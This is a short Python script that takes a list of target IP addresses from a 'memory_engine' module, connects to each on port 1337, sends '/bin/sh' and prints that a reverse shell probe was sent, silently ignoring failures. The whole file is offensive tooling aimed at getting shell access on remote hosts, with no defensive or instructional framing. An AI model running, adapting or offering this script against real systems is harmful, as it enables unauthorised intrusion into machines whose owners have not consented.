import socket

from memory_engine import get_top_targets


def probe_shell():
    for t in get_top_targets():
        ip, _ = t.split(":")
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((ip, 1337))
            s.sendall(b"/bin/sh\n")
            s.close()
            print(f"[+] Reverse shell probe sent to {ip}:1337")
        except:
            pass


if __name__ == "__main__":
    probe_shell()
